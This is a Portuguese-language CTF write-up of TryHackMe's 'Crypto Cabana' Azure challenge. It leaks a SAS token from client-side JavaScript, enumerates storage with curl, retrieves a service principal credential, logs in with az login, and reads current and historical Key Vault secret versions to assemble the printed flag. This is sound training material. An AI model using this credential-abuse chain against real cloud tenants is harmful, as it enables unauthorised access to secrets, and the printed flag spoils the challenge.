# TryHackMe — Hackers Holiday CTF
## Level 9 — Crypto Cabana

**Categoria:** Cloud (Azure) / Exposição de Credenciais / Escalonamento entre Identidades
**Dificuldade:** Difícil

---

### 🛎️ Concierge Briefing

> By the time he made it back from the breakfast buffet, his wallet had already moved on without him. The transaction was signed, properly signed, just not by him.
> He'd backed his seed phrase up weeks ago, into the CryptoCabana kiosk's vault — the one whose landing page promised, in exactly four words, "Backed up. Sleep easy." Somewhere between that promise and this morning, something else got a good look at what was supposed to stay behind glass.
> Your objective: find out what the kiosk is quietly trusting to reach into storage on its own, and see how much further that trust actually extends.

---

## 🎯 Objetivo

O briefing descreve um quiosque chamado **"CryptoCabana"**, que promete guardar a seed phrase de criptomoedas dos hóspedes com segurança ("Backed up. Sleep easy."). O pedido final da vítima ("*something else got a good look at what was supposed to stay behind glass*") e a instrução final ("*find out what the kiosk is quietly trusting... and see how much further that trust extends*") deixam claro o formato do desafio: encontrar uma **credencial confiada silenciosamente pela aplicação** e **seguir a cadeia de confiança** até o fim — um clássico cenário de **exposição de segredo → escalonamento entre identidades na nuvem (Azure)**.

---

## 🔍 Passo 1 — Analisando o front-end do CryptoCabana

O quiosque é uma página estática hospedada em **Azure Static Web Apps ($web)**, com um formulário simples para colar a seed phrase e um botão de "backup". Inspecionando o código-fonte (`view-source:` / arquivo `app.js`):

![app.js do CryptoCabana com o SAS token da Azure Storage exposto no client-side](/Hacker%20Holiday%202026%20-%20THM/9º%20Level%20-%20Crypto%20Cabana/images/app.js.png)

```javascript
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D";

function backupPhrase() {
  const phrase = document.getElementById("phrase").value.trim();
  ...
  const url = "https://" + STORAGE_ACCOUNT + ".blob.core.windows.net/" +
      BACKUPS_CONTAINER + "/" + blobName + "?" + BACKUP_SAS;

  fetch(url, {
    method: "PUT",
    headers: { "x-ms-blob-type": "BlockBlob" },
    body: phrase,
  })
  ...
}
```

Isso já é a primeira falha grave: **um SAS token da Azure Storage embutido diretamente no JavaScript do client-side**, visível a qualquer visitante da página. Analisando os parâmetros do token:

- `sp=rl` → permissões de **leitura (`r`) e listagem (`l`)** — ou seja, apesar de ser usado pela aplicação apenas para *escrever* backups, o token concedido também permite **listar e ler qualquer coisa** acessível ao escopo do SAS.
- `srt=sco` → o escopo do SAS cobre **serviço, contêiner e objeto** — não está restrito a um único contêiner.
- `se=2099-12-31T23:59:59Z` → data de expiração praticamente **inexistente** (ano 2099).

Ou seja: o "quiosque" confia esse token de longa duração e com permissões amplas ao navegador de qualquer pessoa que visite a página — exatamente o "something the kiosk is quietly trusting" mencionado no briefing.

---

## 🔍 Passo 2 — Enumerando a Storage Account com o SAS vazado

Usando o SAS token vazado, foi possível consultar diretamente a Storage Account via `curl`:

![Enumeração de containers e blobs usando o SAS token vazado, culminando na extração de backup-service-account.json](/Hacker%20Holiday%202026%20-%20THM/9º%20Level%20-%20Crypto%20Cabana/images/Enum_and_Backup.json.png)

```bash
curl -i "https://cryptocabanaf5scjagc.blob.core.windows.net/?comp=list&<SAS>"
```

A listagem de contêineres revela três containers na conta:

```
$web        <- hospeda o site estático do CryptoCabana
backups     <- destino "oficial" dos backups feitos pelo app
vault       <- um contêiner que a aplicação NUNCA referencia no front-end
```

O contêiner **`vault`** chama atenção imediatamente: ele não é usado em nenhum lugar do `app.js` visível publicamente, mas o SAS token (com escopo de conta inteira, `srt=sco`) permite acessá-lo do mesmo jeito.

```bash
curl "https://cryptocabanaf5scjagc.blob.core.windows.net/vault?restype=container&comp=list&<SAS>"
```

```xml
<Blobs>
  <Blob><Name>backup-service-account.json</Name>...</Blob>
  <Blob><Name>seed_phrase.txt</Name>...</Blob>
</Blobs>
```

Dois arquivos interessantes: **`seed_phrase.txt`** (provavelmente a seed phrase real da vítima, já comprometida — confirmando a história do briefing) e **`backup-service-account.json`**, um nome que sugere **credenciais de automação**.

### Baixando e lendo o `backup-service-account.json`

```bash
curl -O "https://cryptocabanaf5scjagc.blob.core.windows.net/vault/backup-service-account.json?<SAS>"
cat backup-service-account.json
```

```json
{
  "client_id": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
  "client_secret": "<REDACTED>",
  "key_vault_name": "ccabana-kv-f5scjagc",
  "key_vault_uri": "https://ccabana-kv-f5scjagc.vault.azure.net/",
  "note": "CryptoCabana backup automation account. Rotate this if it ever leaves the vault. -- IT",
  "tenant_id": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"
}
```

Esse é o ponto crítico da cadeia: o SAS token de Storage — que deveria servir apenas para o app "guardar backups" — permitiu alcançar um contêiner não documentado contendo as **credenciais completas de um Service Principal do Azure Active Directory** (`client_id` + `client_secret` + `tenant_id`), com acesso direto a um **Azure Key Vault**. A própria nota deixada pelo time de TI (*"Rotate this if it ever leaves the vault"*) confirma que essa credencial nunca deveria ter saído dali.

---

## 🔍 Passo 3 — Autenticando como o Service Principal vazado

Com as credenciais em mãos, foi utilizado o **Azure CLI** (via Cloud Shell) para autenticar como essa identidade de automação:

![Login inicial no Azure Cloud Shell com a própria conta de baixo privilégio do CTF](/Hacker%20Holiday%202026%20-%20THM/9º%20Level%20-%20Crypto%20Cabana/images/Azure_CLI.png)

A conta inicial do jogador (`usr-08069118@thmctf.onmicrosoft.com`) tem visibilidade limitada — sem recursos visíveis no portal. O próximo passo foi assumir a identidade do Service Principal vazado:

![Login como o Service Principal vazado e listagem dos segredos do Key Vault](/Hacker%20Holiday%202026%20-%20THM/9º%20Level%20-%20Crypto%20Cabana/images/Enum_Azure_Account_Privesc.png)

```bash
az login \
  --service-principal \
  --username dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 \
  --password '<REDACTED>' \
  --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c
```

```json
[
  {
    "cloudName": "AzureCloud",
    "name": "Az-Subs-CTF",
    "user": {
      "name": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",
      "type": "servicePrincipal"
    }
  }
]
```

Autenticado como esse Service Principal, uma tentativa de listar recursos genéricos (`az resource list`, `az keyvault list`) retorna **vazio** — o SP não tem permissão de leitura em nível de assinatura/gestão de recursos. Mas ele **tem acesso de dados (data-plane)** diretamente ao Key Vault já conhecido:

```bash
az keyvault secret list \
  --vault-name ccabana-kv-f5scjagc \
  -o table
```

```
Name          Id
------------  ------------------------------------------------------------------
key-shard-1   https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-1
key-shard-2   https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2
key-shard-3   https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-3
master-key    https://ccabana-kv-f5scjagc.vault.azure.net/secrets/master-key
```

Quatro segredos: três **"shards" (fragmentos)** de uma chave, e uma **`master-key`** (que, à primeira vista, parece o alvo óbvio — mas veremos que é uma pista falsa).

---

## 🔍 Passo 4 — Lendo os fragmentos da chave (`key-shard-1`, `key-shard-2`, `key-shard-3`)

![Valores de key-shard-1 e key-shard-3, e a versão atual (adulterada) de key-shard-2](/Hacker%20Holiday%202026%20-%20THM/9º%20Level%20-%20Crypto%20Cabana/images/KeyShard_1,2,3.png)

```bash
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-1
```
```json
"value": "THM{n0t_ur"
```

```bash
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-3
```
```json
"value": "ur_c0lns!}"
```

Já temos dois terços da flag. Mas ao consultar **`key-shard-2`**, o valor atual não parece parte de uma flag:

```bash
az keyvault secret show --vault-name ccabana-kv-f5scjagc --name key-shard-2
```
```json
"value": "Rotated this after IT flagged it -- old value should still be recoverable if you know where to look."
```

O próprio segredo confessa: ele foi **rotacionado** (o valor atual é apenas um recado da equipe de TI), mas **a versão antiga ainda pode ser recuperada** — Key Vaults do Azure mantêm histórico de versões de um segredo, mesmo após ele ser atualizado, desde que não tenham sido explicitamente removidas/purgadas.

---

## 🔍 Passo 5 — Recuperando a versão antiga de `key-shard-2`

![Listagem de versões de key-shard-2 e recuperação do valor real na versão antiga](/Hacker%20Holiday%202026%20-%20THM/9º%20Level%20-%20Crypto%20Cabana/images/Second_Key_Shard_Flag.png)

```bash
az keyvault secret list-versions \
  --vault-name ccabana-kv-f5scjagc \
  --name key-shard-2 \
  -o json
```

A listagem retorna **duas versões** do segredo, com IDs (timestamps de versão) diferentes. Consultando a versão mais antiga diretamente:

```bash
az keyvault secret show \
  --vault-name ccabana-kv-f5scjagc \
  --name key-shard-2 \
  --version 3d6492d2c6f74123bc754a9ded22b2a0
```

```json
"value": "_k3ys_n0t_"
```

O valor real e original do segundo fragmento estava lá o tempo todo, preservado no histórico de versões — a "rotação" feita pela equipe de TI apenas escondeu o segredo atrás de uma nova versão, sem revogar o acesso de leitura ao histórico.

---

## 🚩 Montando a flag

Concatenando os três fragmentos, na ordem correta:

```
key-shard-1  ->  THM{n0t_ur
key-shard-2  ->  _k3ys_n0t_    (versão antiga)
key-shard-3  ->  ur_c0lns!}
```

```
THM{n0t_ur_k3ys_n0t_ur_c0lns!}
```

Um trocadilho perfeito com o famoso ditado do mundo cripto: ***"Not your keys, not your coins."***

## 🚩 Flag

```
THM{n0t_ur_k3ys_n0t_ur_c0lns!}
```

---

## 📝 Resumo da cadeia de investigação

1. **Briefing** → um quiosque de backup de seed phrases promete segurança, mas algo "confiado silenciosamente" pelo app foi comprometido.
2. **Código-fonte do CryptoCabana (`app.js`)** → expõe um **SAS token da Azure Storage** hardcoded no client-side, com permissões amplas (`sp=rl`, escopo de conta inteira `srt=sco`) e validade até 2099.
3. **Enumeração via SAS** → além do contêiner `backups` (uso "oficial"), o SAS também permite acesso a um contêiner oculto **`vault`**, contendo `seed_phrase.txt` e `backup-service-account.json`.
4. **`backup-service-account.json`** → vaza credenciais completas de um **Service Principal do Azure AD** (client_id, client_secret, tenant_id) com acesso a um **Azure Key Vault**.
5. **`az login --service-principal`** → autentica como essa identidade de automação.
6. **`az keyvault secret list`** → revela quatro segredos: `key-shard-1`, `key-shard-2`, `key-shard-3` e um `master-key` (isca/distração).
7. **Leitura direta de `key-shard-1` e `key-shard-3`** → dois terços da flag.
8. **`key-shard-2` (versão atual)** → segredo "rotacionado", com uma nota indicando que a versão antiga ainda é recuperável.
9. **`az keyvault secret list-versions` + `az keyvault secret show --version`** → recupera a versão antiga de `key-shard-2`, completando a flag.

---
